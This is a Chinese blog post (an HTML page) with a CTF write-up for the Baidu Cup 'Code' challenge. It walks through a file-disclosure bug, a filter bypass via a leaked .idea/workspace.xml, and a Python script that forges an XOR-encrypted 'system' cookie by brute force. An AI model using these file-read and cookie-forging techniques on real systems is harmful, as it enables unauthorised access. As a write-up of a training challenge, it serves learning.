@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="“百度杯”CTF比赛 九月场Code 思路：看到是个图片，查看源代码，base64加密的，再看url，发现可能存在文件泄露 尝试将?jpg=hei.jpg 改为 ?jpg=index.php, 查看源代码，再解密，得到 &lt;?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */...">
+        <meta name="keywords" content="security">
+        <link rel="icon" href="/favicon.ico">
+
+        <title>“百度杯”CTF比赛 九月场Code - Czj's 博客</title>
+
+        <!-- Stylesheets -->
+        <link href="/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('/images/abc.jpg'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+                        <a class="pull-left" href="/">MyBlog</a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="/">首页</a>
+                                <a href="/categories.html">分类</a>
+                                <a href="/tags.html">标签</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">“百度杯”CTF比赛 九月场Code</h1>
+                      <p class="header-date">By <a href="/author/czj.html">Czj</a>, 2019-10-13, 分类:  <a href="/category/icqctf.html">Icqctf</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="/tag/security.html">security</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <h1>“百度杯”CTF比赛 九月场Code</h1>
+<p>思路：看到是个图片，查看源代码，base64加密的，再看url，发现可能存在文件泄露</p>
+<p>尝试将<code>?jpg=hei.jpg</code> 改为 <code>?jpg=index.php</code>, 查看源代码，再解密，得到</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * Created by PhpStorm.</span>
+<span class="sd"> * Date: 2015/11/16</span>
+<span class="sd"> * Time: 1:31</span>
+<span class="sd"> */</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;content-type:text/html;charset=utf-8&#39;</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;jpg&#39;</span><span class="p">]))</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Refresh:0;url=./index.php?jpg=hei.jpg&#39;</span><span class="p">);</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;jpg&#39;</span><span class="p">];</span>
+<span class="k">echo</span> <span class="s1">&#39;&lt;title&gt;file:&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;&lt;/title&gt;&#39;</span><span class="p">;</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/[^a-zA-Z0-9.]+/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;config&quot;</span><span class="p">,</span><span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="nv">$txt</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
+
+<span class="k">echo</span> <span class="s2">&quot;&lt;img src=&#39;data:image/gif;base64,&quot;</span><span class="o">.</span><span class="nv">$txt</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;&lt;/img&gt;&quot;</span><span class="p">;</span>
+
+<span class="cm">/*</span>
+<span class="cm"> * Can you find the flag file?</span>
+<span class="cm"> *</span>
+<span class="cm"> */</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>这里面没有flag，但是发现了一个特殊的替换，config-&gt;_  ，很奇怪。接着发现这个项目是在phpstorm中开发的。</p>
+<p>phpstorm是php代码的集成开发环境，下载phpstorm，并新建一个项目，会发现在项目文件夹里面会生成一个.idea文件，它存储了项目的配置文件，打开.idea文件可以发现<strong>misc.xml,modules.xml,workspace.xml</strong>文件。</p>
+<p>接着访问<code>.idea/workspace.xml</code>页面，发现</p>
+<p><img alt="image-20191013232343815" src="/images/image-20191013232343815.png"></p>
+<p>再次利用？jpg=来访问，发现这两个页面源代码中的数据都为空。再次看回index.php源代码，发现_和config都被限制了，该怎么绕过呢。答案不言而喻，<code>?jpg=fl3gconfigichuqiu.php</code> </p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * Created by PhpStorm.</span>
+<span class="sd"> * Date: 2015/11/16</span>
+<span class="sd"> * Time: 1:31</span>
+<span class="sd"> */</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">||</span> <span class="o">~</span><span class="nx">E_NOTICE</span><span class="p">);</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">);</span>
+
+<span class="c1">// random函数返回长度为length的随机字母和数字</span>
+<span class="k">function</span> <span class="nf">random</span><span class="p">(</span><span class="nv">$length</span><span class="p">,</span> <span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$hash</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nv">$max</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$hash</span> <span class="o">.=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$max</span><span class="p">)];</span> <span class="c1">//mt_rand 返回随机数</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$hash</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// 加密 guest ascll码加10，guest和$key中5位进行异或，$key是rnd+key的md5值，最后返回给cookie的是rnd+异或后的值</span>
+<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span><span class="nv">$key</span><span class="p">){</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">+</span><span class="mi">10</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$txt</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+    <span class="nv">$rnd</span><span class="o">=</span><span class="nx">random</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
+    <span class="nv">$key</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$rnd</span><span class="o">.</span><span class="nv">$key</span><span class="p">);</span>
+    <span class="nv">$s</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$ttmp</span> <span class="o">.=</span> <span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="o">++</span><span class="nv">$s</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$rnd</span><span class="o">.</span><span class="nv">$ttmp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//解密 把rnd和异或后的值分开，异或后的值域$key在进行异或，ascll码值减10，返回。</span>
+<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span><span class="nv">$key</span><span class="p">){</span>
+    <span class="nv">$txt</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span>
+    <span class="nv">$rnd</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+    <span class="nv">$txt</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+    <span class="nv">$key</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$rnd</span><span class="o">.</span><span class="nv">$key</span><span class="p">);</span>
+
+    <span class="nv">$s</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$key</span><span class="p">[</span><span class="o">++</span><span class="nv">$s</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="nv">$tmp1</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">-</span><span class="mi">10</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$tmp1</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s1">&#39;system&#39;</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="nx">encrypt</span><span class="p">(</span><span class="s1">&#39;guest&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">));</span>
+    <span class="k">echo</span> <span class="s2">&quot;╮(╯▽╰)╭&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>关键值：guest，system，key，rnd。</p>
+<p>要得到flag，就要使解密后的值为system。顺着解密方法往回推，得到明文。</p>
+<p>首先把system的ascll码值加10，然后和$key异或得到明文,(这个key值得在加密方法中获得)，再加上rnd，加密，得到最终的payload</p>
+<div class="highlight"><pre><span></span><span class="c1"># _*_ coding: utf-8 _*</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+
+<span class="c1">#返回“抱歉”表情的url</span>
+
+<span class="n">url</span><span class="o">=</span><span class="s2">&quot;http://7870513b86604387b24491ffa40c8c142db5ab5af8074e37.changame.ichunqiu.com/fl3g_ichuqiu.php&quot;</span>
+
+<span class="c1">#请求该url，获取服务器返回的user变量的cookie值,即encrypt(&#39;guest&#39;,$key)</span>
+
+<span class="n">cookie</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span>
+
+<span class="c1">#将密文cookie进行base64解码, 利用首次cookie的值得到5位key</span>
+
+<span class="n">txt</span><span class="o">=</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+
+<span class="n">rnd</span><span class="o">=</span><span class="n">txt</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="c1">#密文的前4位字符为随机字符</span>
+
+<span class="n">ttmp</span><span class="o">=</span><span class="n">txt</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span><span class="c1">#ttmp为&#39;guest&#39;与key进行异或的密文值,ttmp与&#39;guest&#39;的位数一样，为5位</span>
+
+<span class="n">keys</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">)</span> <span class="c1">#六位key的初始字符串</span>
+
+<span class="n">guest</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="s1">&#39;guest&#39;</span><span class="p">)</span><span class="c1">#guest明文内容</span>
+
+<span class="n">system</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">guest</span><span class="p">)):</span>
+
+    <span class="n">guest</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">guest</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="mi">10</span><span class="p">)</span><span class="c1">#guest明文的ascii码加10，为guest加密做准备(encrypt(&#39;guest&#39;,$key))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">guest</span><span class="p">)):</span>
+
+    <span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">ttmp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">guest</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span><span class="c1">#ttmp为&#39;guest&#39;与key进行异或的密文值,则ttmp与guest异或为keys</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">system</span><span class="p">)):</span>
+
+    <span class="n">system</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">system</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="mi">10</span><span class="p">)</span><span class="c1">#system的ascii码加10，为system加密做准备</span>
+
+<span class="n">letters</span><span class="o">=</span><span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;</span><span class="c1">#第六位key的爆破字符</span>
+
+<span class="n">ttmp_new</span><span class="o">=</span><span class="s1">&#39;&#39;</span> <span class="c1">#system与keys的异或值</span>
+
+<span class="n">cookie_system</span><span class="o">=</span><span class="p">[]</span>
+
+<span class="nb">str</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+
+    <span class="n">keys</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">=</span><span class="n">ch</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">system</span><span class="p">)):</span>
+
+        <span class="n">ttmp_new</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">system</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+        <span class="k">print</span> <span class="nb">ord</span><span class="p">(</span><span class="n">system</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">system</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+    <span class="nb">str</span><span class="o">=</span><span class="n">rnd</span><span class="o">+</span><span class="n">ttmp_new</span> <span class="c1">#随机字符与异或结果进行拼接</span>
+
+    <span class="n">cookie_system</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">str</span><span class="p">))</span> <span class="c1">#将拼接结果进行base64加密，得到flag界面的cookie值，并将其填充到字典cookie_system中</span>
+
+    <span class="n">ttmp_new</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="c1">#爆破一次，就将ttmp_new初始化一次</span>
+
+<span class="c1">#</span>
+
+<span class="c1"># print cookie_system #输出所有可能的key爆破得到的cookie值</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cookie_system</span><span class="p">:</span>
+
+    <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="n">i</span><span class="p">}</span> <span class="c1">#cookie变量为user,值为i</span>
+
+    <span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span> <span class="c1">#用所有的cookie值去尝试访问服务器，得到的反馈为res</span>
+
+    <span class="k">if</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">:</span><span class="c1">#如果反馈的内容含有‘flag’关键字，则说明请求的cookie正确，即keys爆破成功</span>
+
+        <span class="c1">#print  cookie_system[i] #输出正确的cookie值</span>
+
+        <span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span> <span class="c1">#输出服务器反馈的内容，即flag</span>
+</pre></div>
+
+
+        
+    </div>
+        <!-- /Content --> 
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="/archives.html">Archives</a></li>
+                            <li><a href="/tags.html">Tags</a></li>
+                            <li><a href="/authors.html">Authors</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="#" target="_blank">You can add links in your config file</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Links</div>
+                        <ul class="list-unstyled">
+                            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+                            <li><a href="http://python.org/" target="_blank">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
+                        </ul>
+                    </div> 
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Proudly powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme and code by <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                            <small>&copy; blogname 2015</small>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+    </body>
+</html>
